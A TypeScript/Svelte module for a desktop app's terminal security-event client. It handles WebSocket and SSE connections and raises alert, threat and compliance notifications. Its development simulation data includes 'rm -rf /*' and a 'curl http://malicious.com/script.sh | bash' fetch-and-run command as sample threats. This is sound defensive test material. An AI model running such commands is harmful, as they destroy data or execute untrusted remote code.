import { writable, get } from 'svelte/store';
import { globalSecuritySettings, type SecurityAlert, type AuditEvent } from '$lib/stores/terminalSecurity';
import { toastManager } from '$lib/stores/toast';

export interface SecurityEventConnection {
  connect(): Promise<void>;
  disconnect(): void;
  isConnected(): boolean;
  subscribe(callback: (event: SecurityEvent) => void): () => void;
}

export interface SecurityEvent {
  type: 'alert' | 'audit' | 'threat' | 'compliance' | 'status';
  severity: 'info' | 'warning' | 'error' | 'critical';
  timestamp: string;
  terminalId?: string;
  sessionId?: string;
  data: any;
}

export interface SecurityThreatEvent extends SecurityEvent {
  type: 'threat';
  data: {
    threatType: 'malicious_command' | 'suspicious_pattern' | 'privilege_escalation' | 'data_exfiltration';
    command?: string;
    riskScore: number;
    indicators: string[];
    recommendation: string;
  };
}

export interface SecurityComplianceEvent extends SecurityEvent {
  type: 'compliance';
  data: {
    rule: string;
    status: 'passed' | 'failed' | 'warning';
    details: string;
    remediation?: string;
  };
}

// Store for connection status and events
export const securityEventStore = writable<{
  connected: boolean;
  lastEvent: SecurityEvent | null;
  eventHistory: SecurityEvent[];
  connectionError: string | null;
}>({
  connected: false,
  lastEvent: null,
  eventHistory: [],
  connectionError: null
});

class WebSocketSecurityEventConnection implements SecurityEventConnection {
  private ws: WebSocket | null = null;
  private url: string;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 5;
  private reconnectInterval = 1000;
  private subscribers: Array<(event: SecurityEvent) => void> = [];
  private heartbeatInterval: ReturnType<typeof setInterval> | null = null;

  constructor(url: string) {
    this.url = url;
  }

  async connect(): Promise<void> {
    try {
      this.ws = new WebSocket(this.url);
      
      this.ws.onopen = () => {
        console.log('Security event WebSocket connected');
        this.reconnectAttempts = 0;
        securityEventStore.update(state => ({
          ...state,
          connected: true,
          connectionError: null
        }));

        // Send authentication/identification
        this.send({
          type: 'auth',
          clientType: 'orchflow-desktop',
          version: '1.0.0'
        });

        // Start heartbeat
        this.startHeartbeat();
      };

      this.ws.onmessage = (event) => {
        try {
          const securityEvent: SecurityEvent = JSON.parse(event.data);
          this.handleSecurityEvent(securityEvent);
        } catch (error) {
          console.error('Failed to parse security event:', error);
        }
      };

      this.ws.onclose = (event) => {
        console.log('Security event WebSocket closed:', event.code, event.reason);
        this.stopHeartbeat();
        securityEventStore.update(state => ({
          ...state,
          connected: false
        }));

        // Attempt reconnection if not a clean close
        if (event.code !== 1000 && this.reconnectAttempts < this.maxReconnectAttempts) {
          this.attemptReconnect();
        }
      };

      this.ws.onerror = (error) => {
        console.error('Security event WebSocket error:', error);
        securityEventStore.update(state => ({
          ...state,
          connected: false,
          connectionError: 'WebSocket connection failed'
        }));
      };

    } catch (error) {
      throw new Error(`Failed to connect to security event WebSocket: ${error}`);
    }
  }

  disconnect(): void {
    this.stopHeartbeat();
    if (this.ws) {
      this.ws.close(1000, 'Client disconnect');
      this.ws = null;
    }
    securityEventStore.update(state => ({
      ...state,
      connected: false
    }));
  }

  isConnected(): boolean {
    return this.ws?.readyState === WebSocket.OPEN;
  }

  subscribe(callback: (event: SecurityEvent) => void): () => void {
    this.subscribers.push(callback);
    return () => {
      const index = this.subscribers.indexOf(callback);
      if (index > -1) {
        this.subscribers.splice(index, 1);
      }
    };
  }

  private send(data: any): void {
    if (this.ws?.readyState === WebSocket.OPEN) {
      this.ws.send(JSON.stringify(data));
    }
  }

  private handleSecurityEvent(event: SecurityEvent): void {
    // Update store
    securityEventStore.update(state => ({
      ...state,
      lastEvent: event,
      eventHistory: [event, ...state.eventHistory.slice(0, 99)] // Keep last 100 events
    }));

    // Notify subscribers
    this.subscribers.forEach(callback => callback(event));

    // Handle specific event types
    switch (event.type) {
      case 'alert':
        this.handleSecurityAlert(event);
        break;
      case 'threat':
        this.handleThreatEvent(event as SecurityThreatEvent);
        break;
      case 'compliance':
        this.handleComplianceEvent(event as SecurityComplianceEvent);
        break;
      case 'audit':
        this.handleAuditEvent(event);
        break;
    }
  }

  private handleSecurityAlert(event: SecurityEvent): void {
    const alert: SecurityAlert = {
      id: crypto.randomUUID(),
      timestamp: new Date(event.timestamp),
      severity: event.severity,
      message: event.data.message || 'Security alert received',
      terminalId: event.terminalId,
      actionRequired: event.severity === 'critical' || event.severity === 'error'
    };

    // Add to global security settings
    globalSecuritySettings.update(settings => ({
      ...settings,
      alerts: [...settings.alerts, alert]
    }));

    // Show toast notification for high severity alerts
    if (event.severity === 'error' || event.severity === 'critical') {
      toastManager.securityAlert(
        alert.message,
        event.severity,
        [
          {
            label: 'View Details',
            variant: 'primary',
            handler: () => {
              // Could open a security details modal
              console.log('Security alert details:', event);
            }
          },
          {
            label: 'Acknowledge',
            variant: 'secondary',
            handler: () => {
              // Mark as acknowledged
            }
          }
        ]
      );
    }
  }

  private handleThreatEvent(event: SecurityThreatEvent): void {
    const { threatType, riskScore, command, indicators, recommendation } = event.data;
    
    let message = `Threat detected: ${threatType.replace('_', ' ')}`;
    if (command) {
      message += ` - Command: "${command}"`;
    }
    message += ` (Risk: ${riskScore}/10)`;

    toastManager.securityAlert(
      message,
      riskScore >= 8 ? 'error' : 'warning',
      [
        {
          label: 'Block Command',
          variant: 'primary',
          handler: () => {
            // Could send a block command request
            console.log('Blocking command:', command);
          }
        },
        {
          label: 'View Analysis',
          variant: 'secondary',
          handler: () => {
            console.log('Threat analysis:', { indicators, recommendation });
          }
        }
      ]
    );
  }

  private handleComplianceEvent(event: SecurityComplianceEvent): void {
    const { rule, status, details, remediation } = event.data;
    
    if (status === 'failed') {
      toastManager.warning(`Compliance check failed: ${rule}`, {
        title: 'Compliance Violation',
        actions: [
          {
            label: 'View Details',
            handler: () => {
              console.log('Compliance details:', { details, remediation });
            }
          }
        ]
      });
    }
  }

  private handleAuditEvent(event: SecurityEvent): void {
    // Audit events are typically logged silently
    // Could update audit logs display if it's open
    console.log('Audit event:', event);
  }

  private attemptReconnect(): void {
    this.reconnectAttempts++;
    const delay = this.reconnectInterval * Math.pow(2, this.reconnectAttempts - 1);
    
    console.log(`Attempting to reconnect security events (${this.reconnectAttempts}/${this.maxReconnectAttempts}) in ${delay}ms`);
    
    setTimeout(() => {
      if (this.reconnectAttempts <= this.maxReconnectAttempts) {
        this.connect().catch(error => {
          console.error('Reconnection failed:', error);
          if (this.reconnectAttempts >= this.maxReconnectAttempts) {
            securityEventStore.update(state => ({
              ...state,
              connectionError: 'Failed to reconnect after multiple attempts'
            }));
          }
        });
      }
    }, delay);
  }

  private startHeartbeat(): void {
    this.heartbeatInterval = setInterval(() => {
      if (this.isConnected()) {
        this.send({ type: 'ping', timestamp: new Date().toISOString() });
      }
    }, 30000); // 30 second heartbeat
  }

  private stopHeartbeat(): void {
    if (this.heartbeatInterval) {
      clearInterval(this.heartbeatInterval);
      this.heartbeatInterval = null;
    }
  }
}

class SSESecurityEventConnection implements SecurityEventConnection {
  private eventSource: EventSource | null = null;
  private url: string;
  private subscribers: Array<(event: SecurityEvent) => void> = [];

  constructor(url: string) {
    this.url = url;
  }

  async connect(): Promise<void> {
    try {
      this.eventSource = new EventSource(this.url);
      
      this.eventSource.onopen = () => {
        console.log('Security event SSE connected');
        securityEventStore.update(state => ({
          ...state,
          connected: true,
          connectionError: null
        }));
      };

      this.eventSource.onmessage = (event) => {
        try {
          const securityEvent: SecurityEvent = JSON.parse(event.data);
          this.handleSecurityEvent(securityEvent);
        } catch (error) {
          console.error('Failed to parse security event:', error);
        }
      };

      this.eventSource.onerror = (error) => {
        console.error('Security event SSE error:', error);
        securityEventStore.update(state => ({
          ...state,
          connected: false,
          connectionError: 'SSE connection failed'
        }));
      };

    } catch (error) {
      throw new Error(`Failed to connect to security event SSE: ${error}`);
    }
  }

  disconnect(): void {
    if (this.eventSource) {
      this.eventSource.close();
      this.eventSource = null;
    }
    securityEventStore.update(state => ({
      ...state,
      connected: false
    }));
  }

  isConnected(): boolean {
    return this.eventSource?.readyState === EventSource.OPEN;
  }

  subscribe(callback: (event: SecurityEvent) => void): () => void {
    this.subscribers.push(callback);
    return () => {
      const index = this.subscribers.indexOf(callback);
      if (index > -1) {
        this.subscribers.splice(index, 1);
      }
    };
  }

  private handleSecurityEvent(event: SecurityEvent): void {
    // Same handling as WebSocket implementation
    securityEventStore.update(state => ({
      ...state,
      lastEvent: event,
      eventHistory: [event, ...state.eventHistory.slice(0, 99)]
    }));

    this.subscribers.forEach(callback => callback(event));
    // Additional event handling would go here
  }
}

// Security event manager
export class SecurityEventManager {
  private connection: SecurityEventConnection | null = null;
  private connectionType: 'websocket' | 'sse' = 'websocket';

  constructor(
    private baseUrl: string = 'ws://localhost:8080',
    connectionType: 'websocket' | 'sse' = 'websocket'
  ) {
    this.connectionType = connectionType;
  }

  async connect(): Promise<void> {
    const url = this.connectionType === 'websocket' 
      ? `${this.baseUrl}/security-events`
      : `${this.baseUrl.replace('ws:', 'http:')}/security-events/stream`;

    this.connection = this.connectionType === 'websocket'
      ? new WebSocketSecurityEventConnection(url)
      : new SSESecurityEventConnection(url);

    await this.connection.connect();
  }

  disconnect(): void {
    this.connection?.disconnect();
    this.connection = null;
  }

  subscribe(callback: (event: SecurityEvent) => void): () => void {
    return this.connection?.subscribe(callback) || (() => {});
  }

  isConnected(): boolean {
    return this.connection?.isConnected() || false;
  }

  // Simulate security events for development/testing
  simulateEvents(): void {
    const events: SecurityEvent[] = [
      {
        type: 'alert',
        severity: 'warning',
        timestamp: new Date().toISOString(),
        terminalId: 'terminal-1',
        data: {
          message: 'Suspicious command pattern detected',
          pattern: 'rm -rf /*'
        }
      },
      {
        type: 'threat',
        severity: 'error',
        timestamp: new Date().toISOString(),
        terminalId: 'terminal-2',
        data: {
          threatType: 'malicious_command',
          command: 'curl http://malicious.com/script.sh | bash',
          riskScore: 9,
          indicators: ['Remote script execution', 'Suspicious domain'],
          recommendation: 'Block command and investigate source'
        }
      } as SecurityThreatEvent,
      {
        type: 'compliance',
        severity: 'warning',
        timestamp: new Date().toISOString(),
        data: {
          rule: 'No sudo without justification',
          status: 'failed',
          details: 'sudo command used without proper audit trail',
          remediation: 'Configure sudo logging or use alternative approach'
        }
      } as SecurityComplianceEvent
    ];

    let index = 0;
    const interval = setInterval(() => {
      if (index >= events.length) {
        clearInterval(interval);
        return;
      }

      const event = events[index++];
      securityEventStore.update(state => ({
        ...state,
        lastEvent: event,
        eventHistory: [event, ...state.eventHistory.slice(0, 99)]
      }));

      // Trigger event handlers
      if (this.connection) {
        this.connection['handleSecurityEvent']?.(event);
      }
    }, 2000);
  }
}

// Export singleton instance
export const securityEventManager = new SecurityEventManager();

// Auto-connect when module loads (can be disabled via config)
let autoConnectAttempted = false;
export function enableAutoConnect() {
  if (!autoConnectAttempted) {
    autoConnectAttempted = true;
    securityEventManager.connect().catch(error => {
      console.warn('Failed to auto-connect security events:', error);
      // Fallback to simulation in development
      if (import.meta.env.DEV) {
        console.log('Using simulated security events for development');
        securityEventManager.simulateEvents();
      }
    });
  }
}